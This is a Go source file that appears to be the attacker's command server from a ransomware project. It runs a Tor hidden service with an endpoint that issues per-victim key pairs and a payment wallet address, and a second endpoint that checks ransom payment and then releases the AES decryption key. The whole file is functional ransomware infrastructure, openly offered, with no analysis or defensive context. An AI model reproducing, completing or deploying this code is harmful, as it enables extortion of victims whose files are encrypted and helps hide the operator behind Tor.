package main

import (
    "io"
    "os"
    "log"
    "net/http"
    "encoding/binary"

    "github.com/julienschmidt/httprouter"
    "github.com/sug0/sr-ransomware/go/exe"
    "github.com/sug0/sr-ransomware/go/crypto/scheme/attacker"
)

var tor *exe.Tor
var scheme *attacker.Scheme

func main() {
    go setup()
    <-signalListener()
    if tor != nil {
        tor.Close()
    }
    log.Println("Exiting")
}

func setup() {
    // start tor in the background
    tor = exe.NewTor("", os.Getenv("FLUTORRC"))

    log.Println("Starting tor")
    err := tor.Start()
    if err != nil {
        log.Fatal(err)
    }

    // instantiate the crypto scheme
    scheme = attacker.NewScheme()
    go scheme.VerifyPaymentsBackground()

    // http router config
    router := httprouter.New()
    router.GET("/oracle", handleOracle)
    router.GET("/verify/:pubkey", handleVerify)

    // start server
    log.Println("Listening on localhost at :9999 and :80 on the hidden service")
    log.Fatal(http.ListenAndServe(":9999", loggingMiddleware(router)))
}

func loggingMiddleware(next http.Handler) http.Handler {
    handler := func(w http.ResponseWriter, r *http.Request) {
        log.Printf("%s\t%s\t%s\n", r.RemoteAddr, r.Method, r.RequestURI)
        next.ServeHTTP(w, r)
    }
    return http.HandlerFunc(handler)
}

func handleOracle(w http.ResponseWriter, r *http.Request, _ httprouter.Params) {
    keys, err := scheme.GenerateAndStoreKeys()
    if err != nil {
        http.Error(w, err.Error(), http.StatusInternalServerError)
        return
    }

    w.Header().Set("Content-Disposition", `attachment; filename="keys.bin"`)

    // write wallet addr
    io.WriteString(w, keys.Wallet)

    // write keys
    var size int64

    size = int64(len(keys.Public))
    binary.Write(w, binary.BigEndian, &size)
    w.Write(keys.Public)

    size = int64(len(keys.Secret))
    binary.Write(w, binary.BigEndian, &size)
    w.Write(keys.Secret)
}

func handleVerify(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
    var response int64
    aesIVKey := scheme.VerifyPayment(ps.ByName("pubkey"))

    if aesIVKey == nil {
        binary.Write(w, binary.BigEndian, &response)
        return
    }

    w.Header().Set("Content-Disposition", `attachment; filename="aes.bin"`)

    response = 1
    binary.Write(w, binary.BigEndian, &response)
    w.Write(aesIVKey)
}
